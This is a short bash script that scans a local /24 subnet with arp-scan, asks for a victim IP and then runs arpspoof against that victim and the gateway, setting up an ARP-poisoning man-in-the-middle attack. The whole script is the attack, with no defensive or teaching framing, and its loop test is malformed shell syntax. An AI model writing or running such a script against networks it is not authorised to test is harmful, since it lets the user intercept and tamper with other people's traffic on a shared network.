#!/bin/bash
# CREATED BY AHMED HAMAD 
#THIS IS NEW EDIT **** DATE:28/09/2016 TIME:05:34 PM Egypt ****
# *********************&&&&&&&&&&&&&*******^^^^^^^^^^^^^^^^^^****%%%%%%*************
#ARPSCAN COMMANDS
read -p "Please enter the Gateway to scan the ip:  " gateway
sudo arp-scan $gateway/24
#LOOP COMMNADS
read -p "Pleas Enter The ip from above: " ip
until [ $ip -a $gateway ]
do
	echo "******************************please enter the ip*******************************"
	read -p "Pleas Enter The ip from above: " ip

done
#ARPSPOOF COMMANDS
sudo arpspoof -i wlan0 -t $ip -r $gateway


